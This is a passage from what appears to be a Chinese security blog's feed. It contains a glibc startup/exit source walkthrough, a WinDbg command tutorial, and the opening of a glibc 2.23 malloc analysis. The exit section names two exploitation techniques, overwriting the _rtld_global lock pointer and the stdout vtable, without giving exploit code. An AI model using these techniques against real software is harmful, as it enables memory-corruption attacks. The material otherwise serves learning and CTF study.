class="line">.text:080483C0</span><br><span class="line">.text:080483C0 loc_80483C0:                            ; CODE XREF: frame_dummy+9↑j</span><br><span class="line">.text:080483C0                 mov     edx, 0</span><br><span class="line">.text:080483C5                 test    edx, edx</span><br><span class="line">.text:080483C7                 jz      short loc_80483BB</span><br><span class="line">.text:080483C9                 push    ebp</span><br><span class="line">.text:080483CA                 mov     ebp, esp</span><br><span class="line">.text:080483CC                 sub     esp, 14h</span><br><span class="line">.text:080483CF                 push    eax</span><br><span class="line">.text:080483D0                 call    edx</span><br><span class="line">.text:080483D2                 add     esp, 10h</span><br><span class="line">.text:080483D5                 leave</span><br><span class="line">.text:080483D6                 jmp     register_tm_clones</span><br><span class="line">.text:080483D6 frame_dummy     endp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也就是执行完<code>_init</code>函数之后会执行<code>frame_dummy</code>函数，该函数的主要作用就是调用<code>__register_frame_info</code>函数，<code>frame_dummy</code>函数是为<code>__register_frame_info</code>函数设置参数的，并进行错误处理。这里不做详细的分析。函数调用完成后返回到<code>libc_csu_init</code>函数中，接着返回到<code>libc_start_main</code>函数中，我们接着分析源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">STATIC <span class="type">int</span></span><br><span class="line">    <span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">                     <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">                     #ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params">                     ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">                     #endif</span></span><br><span class="line"><span class="params">                     __typeof (main) init,</span></span><br><span class="line"><span class="params">                     <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">                     <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//环境变量和辅助变量的处理</span></span><br><span class="line">    <span class="comment">//调用一系列的初始化函数，设置安全相关的参数</span></span><br><span class="line">    <span class="comment">//最为重要的是调用了`.init`中存储的函数和`.init_array`中存储的函数</span></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="comment">/* Auditing checkpoint: we have a new object.  */</span></span><br><span class="line">    <span class="comment">//应该是处理动态链接相关</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_naudit) &gt; <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">audit_ifaces</span> *<span class="title">afct</span> =</span> GLRO(dl_audit);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">head</span> =</span> GL(dl_ns)[LM_ID_BASE]._ns_loaded;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> cnt = <span class="number">0</span>; cnt &lt; GLRO(dl_naudit); ++cnt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (afct-&gt;preinit != <span class="literal">NULL</span>)</span><br><span class="line">                afct-&gt;preinit (&amp;head-&gt;l_audit[cnt].cookie);</span><br><span class="line"></span><br><span class="line">            afct = afct-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">        GLRO(dl_debug_printf) (<span class="string">&quot;\ntransferring control: %s\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">    _dl_debug_initialize (<span class="number">0</span>, LM_ID_BASE);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> HAVE_CLEANUP_JMP_BUF</span></span><br><span class="line">    <span class="comment">/* Memory for the cancellation buffer.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pthread_unwind_buf</span> <span class="title">unwind_buf</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> not_first_call;</span><br><span class="line">    not_first_call = setjmp ((<span class="keyword">struct</span> __jmp_buf_tag *) unwind_buf.cancel_jmp_buf);</span><br><span class="line">    <span class="keyword">if</span> (__glibc_likely (! not_first_call))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pthread</span> *<span class="title">self</span> =</span> THREAD_SELF;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Store old info.  */</span></span><br><span class="line">        unwind_buf.priv.data.prev = THREAD_GETMEM (self, cleanup_jmp_buf);</span><br><span class="line">        unwind_buf.priv.data.cleanup = THREAD_GETMEM (self, cleanup);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Store the new cleanup handler info.  */</span></span><br><span class="line">        THREAD_SETMEM (self, cleanup_jmp_buf, &amp;unwind_buf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Run the program.  */</span></span><br><span class="line">        result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Remove the thread-local data.  */</span></span><br><span class="line">        <span class="meta"># <span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        PTHFCT_CALL (ptr__nptl_deallocate_tsd, ());</span><br><span class="line">        <span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">        <span class="keyword">extern</span> <span class="type">void</span> __nptl_deallocate_tsd (<span class="type">void</span>) __attribute ((weak));</span><br><span class="line">        __nptl_deallocate_tsd ();</span><br><span class="line">        <span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* One less thread.  Decrement the counter.  If it is zero we</span></span><br><span class="line"><span class="comment"> terminate the entire process.  */</span></span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        <span class="meta"># <span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> *ptr = __libc_pthread_functions.ptr_nthreads;</span><br><span class="line">        <span class="meta">#  <span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">        PTR_DEMANGLE (ptr);</span><br><span class="line">        <span class="meta">#  <span class="keyword">endif</span></span></span><br><span class="line">        <span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">        <span class="keyword">extern</span> <span class="type">unsigned</span> <span class="type">int</span> __nptl_nthreads __attribute ((weak));</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> *<span class="type">const</span> ptr = &amp;__nptl_nthreads;</span><br><span class="line">        <span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! atomic_decrement_and_test (ptr))</span><br><span class="line">            <span class="comment">/* Not much left to do but to exit the thread, not the process.  */</span></span><br><span class="line">            __exit_thread ();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">/* Nothing fancy, just call the function.  */</span></span><br><span class="line">    result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span> (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后根据是否设置了<code>HAVE_CLEANUP_JMP_BUF</code>来调用<code>main</code>函数，函数的返回结果存储在了<code>result</code>变量中。调用完毕<code>main</code>函数之后将函数的返回结果作为参数传递到<code>exit</code>函数中，函数位于<code>stdlib/exit.c</code>文件中</p><h5 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">    <span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">    __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">    attribute_hidden</span><br><span class="line">    __run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">                         <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line">    <span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">    <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">//依次调用tls_dtor_list中存储的函数指针</span></span><br><span class="line">        __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">    <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span></span><br><span class="line">                &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">            <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">                    <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">                    <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> ef_free:</span><br><span class="line">                <span class="keyword">case</span> ef_us:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> ef_on:</span><br><span class="line">                    onfct = f-&gt;func.on.fn;</span><br><span class="line">                    <span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">                    PTR_DEMANGLE (onfct);</span><br><span class="line">                    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                    onfct (status, f-&gt;func.on.arg);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> ef_at:</span><br><span class="line">                    atfct = f-&gt;func.at;</span><br><span class="line">                    <span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">                    PTR_DEMANGLE (atfct);</span><br><span class="line">                    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                    atfct ();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> ef_cxa:</span><br><span class="line">                    cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">                    <span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">                    PTR_DEMANGLE (cxafct);</span><br><span class="line">                    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                    cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *listp = cur-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">   allocate element.  */</span></span><br><span class="line">            <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//清理IO。即调用_IO_cleanup</span></span><br><span class="line">    <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">        RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">    _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数首先调用了<code>__call_tls_dtors</code>，该函数会依次调用<code>tls_dtor_list</code>中存储的函数指针，接着按照顺序调用了之前在<code>at_exit</code>中注册的函数，我们跟踪函数的调用过程，首先调用的是<code>dl_fini</code>也就是传入的<code>fini</code>函数，该函数定义在<code>elf/dl-fini.c</code>文件中，函数的主要作用是释放程序链接的共享库。在该函数中我们需要注意的是下面的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br></pre></td></tr></table></figure><p>我们看一下函数的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">       GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>即<code>__rtld_lock_unlock_recursive</code>是<code>rtld_global</code>结构体中的一个函数指针。</p><p>函数还逆序调用了<code>.fini_array</code>中的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">        (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                        + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                      / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">    <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">        ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行完毕之后执行了程序中的<code>_fini</code>函数，也就是保存在<code>.fini</code>段中的函数。执行完毕之后返回到<code>__run_exit_handlers</code>函数，最后调用<code>IO_cleanup</code>和系统调用<code>_exit</code>，至此程序完全退出。</p><blockquote><p>那么针对<code>exit</code>函数的利用现在可以发现有两种方式，一种是利用调用<code>dl_fini</code>函数，覆盖<code>rtld_global</code>结构体中的<code>__rtld_lock_unlock_recursive</code>指针；另一种是利用调用<code>IO_cleanup-&gt;IO_flush_all_lockup</code>函数覆盖<code>stdout</code>中的<code>vtable</code>指针</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://luomuxiaoxiao.com/?p=516">Linux X86 程序启动 – main函数是如何被执行的？</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windbg教程</title>
      <link href="/posts/3142214610.html"/>
      <url>/posts/3142214610.html</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>有两种方式可以进行安装，一种是直接在微软的应用商店中搜索<code>windbg preview</code>进行安装下载，另一种是通过安装<code>win10 SDK</code>中的<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools">debugging tools</a>进行安装。我是采用第二种方式进行安装的，因为第一种方式下载安装的<code>windbg preview</code>无法运行。</p><p>下载下来之后运行选择<code>Debugging Tools for Windows</code>下载完成之后到一开始选择的目录下面寻找安装文件，安装即可。</p><h2 id="安装symbols"><a href="#安装symbols" class="headerlink" title="安装symbols"></a>安装<code>symbols</code></h2><ol><li><p>将<code>windbg</code>的安装目录加入到环境变量中方便程序寻找<code>SYMSRV.DLL, SYMSTORE.EXE</code>文件</p></li><li><p>新建环境变量<code>_NT_SYMBOL_PATH</code>，其值设置为<code>SRV*c:\mysymbol* http://msdl.microsoft.com/download/symbols</code>，或者查看<a href="http://www.windbg.org/">windbg</a>的项目地址获取服务器的地址</p><p>前面的设置的文件夹是用来存储下载的符号文件的，也可以将值设置为<code>cache*c:\mysymbol;srv*http://msdl.microsoft.com/download/symbols</code></p></li></ol><p><code>attach</code>一个进程，即可以在相应的文件夹下面看到下载的符号文件了</p><h2 id="设置工作空间"><a href="#设置工作空间" class="headerlink" title="设置工作空间"></a>设置工作空间</h2><p><code>windbg</code>会保存每一个你调试的工程信息，类似于<code>ida</code>的项目文件。每个调试的工作空间的信息默认保存在<code>HKEY_CURRENT_USER\Software\Microsoft\Windbg\Workspaces</code>中，在这个键下一般有4个子键<code>User、Kernel、Dump、Explicit</code>, 他们分别保存用户态调试，内核态调试、转储文件调试、以及手动保存（<code>Save Workspace As</code>）的工作空间信息。</p><p>若发现没有相应的子键则说明还没有使用过相应的调试方式。</p><h2 id="命令注解"><a href="#命令注解" class="headerlink" title="命令注解"></a>命令注解</h2><p><a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debugger-commands">文档</a></p><ul><li>a表示ASCII码</li><li>b表示字节和ASCII码</li><li>c表示DWORD和ASCII码</li><li>d表示DWORD</li><li>D表示双精度浮点数</li><li>f表示单精度浮点数</li><li>p表示按指针宽度显示</li><li>q表示四字（8字节）</li><li>u表示UNICODE字符</li><li>w表示字</li><li>W表示字和ASCII码</li><li>yb表示二进制和字节</li><li>yd表示二进制和双字</li></ul><table><thead><tr><th align="left">命令</th><th>含义</th></tr></thead><tbody><tr><td align="left">g {address}</td><td>运行/运行到指定地址</td></tr><tr><td align="left">gu</td><td>执行到从当前函数返回</td></tr><tr><td align="left">t, tb</td><td>步入, 追踪到下一条分支指令</td></tr><tr><td align="left">p</td><td>步过</td></tr><tr><td align="left">pc</td><td>代码运行至下一个子例程调用处</td></tr><tr><td align="left">wt</td><td>和p类似，可以获取被调用函数的一些信息（如被调用了几次，执行了多少指令等）</td></tr><tr><td align="left">r</td><td>查看和修改寄存器</td></tr><tr><td align="left">rm</td><td>查看和修改寄存器掩码，用来查看XMM或者MMX寄存器的值</td></tr><tr><td align="left">u [start] [end]</td><td>反汇编代码</td></tr><tr><td align="left">uf</td><td>反汇编当前$ip所在的函数</td></tr><tr><td align="left">ub</td><td>反汇编当前$ip之前的指令</td></tr><tr><td align="left">k/kp/kb/kf</td><td>显示函数栈帧/解析函数和参数类型/显示前三个函数参数/显示函数只用栈的大小</td></tr><tr><td align="left">d{a|b|c|d|D|f|p|q|u|w|W|yd|yb}</td><td>查看内存</td></tr><tr><td align="left">d{d|q|p}s</td><td>将内存中的一个元素（d表示四字节|q表示八字节|p表示根据架构选择）作为一个符号进行解析。用来查看栈</td></tr><tr><td align="left">d*u</td><td>同上，以Unicode解释内存中的一个元素</td></tr><tr><td align="left">s</td><td>搜索内存  s -d 0x0 l?0x7fffffff 0x1a2c3b4d 全局搜索0x1a2c3b4d值</td></tr><tr><td align="left">bp/bu</td><td>设置断点/设置延迟解析的断点</td></tr><tr><td align="left">ba {r|w}{1|2|4}</td><td>设置内存断点（访问|写入）（1字节|2字节|4字节）</td></tr><tr><td align="left">b{d|e|c}</td><td>禁用/启用/清除断点</td></tr><tr><td align="left">bm</td><td>批量设置断点</td></tr><tr><td align="left">bp &lt;address&gt; “cmd”</td><td>条件断点设置/断点后执行的命令bp JP2KLib+50567 “r eax; r ecx; .if(ecx&gt;=fd){}.else{g;};”</td></tr><tr><td align="left">dv { |/i|/V}</td><td>显示局部变量|显示符合类型和参数类型|显示变量存储位置</td></tr><tr><td align="left">dt {struct} address</td><td>以struct结构查看数据/内存</td></tr><tr><td align="left">!address</td><td>查看指定的地址是栈内存还是堆内存，如果未指定地址则枚举所有内存区域</td></tr><tr><td align="left">!peb/!teb</td><td>获取进程的PEB和线程的TEB</td></tr><tr><td align="left">!gle</td><td>显示错误码和格式化字符串</td></tr><tr><td align="left">.cxr &lt;content address&gt;</td><td>重新指定上下文</td></tr><tr><td align="left">e{d|b}</td><td>修改全局变量/修改当前执行的代码</td></tr><tr><td align="left">!error</td><td>根据错误码查找错误信息</td></tr><tr><td align="left">poi(address)</td><td>获取address指向内存的内容</td></tr><tr><td align="left">?</td><td>计算表达式</td></tr><tr><td align="left">.formats &lt;data&gt;</td><td>data进行格式转换（显示所有的格式）</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> PWN总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>glibc2.23中的malloc和free源码分析</title>
      <link href="/posts/4051894441.html"/>
      <url>/posts/4051894441.html</url>
      
        <content type="html"><![CDATA[<h1 id="管理结构"><a href="#管理结构" class="headerlink" title="管理结构"></a>管理结构</h1><h2 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h2><p><code>chunk</code>的基本结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 典型的chunk结构</span></span><br><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    |             Size of previous chunk, <span class="keyword">if</span> allocated            | |</span><br><span class="line">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    |             Size of chunk, in bytes                       |M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    |             User data starts here...                          .</span><br><span class="line">    .                                                               .</span><br><span class="line">    .             (malloc_usable_size() bytes)                      .</span><br><span class="line">    .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    |             Size of chunk                                     |</span><br><span class="line">    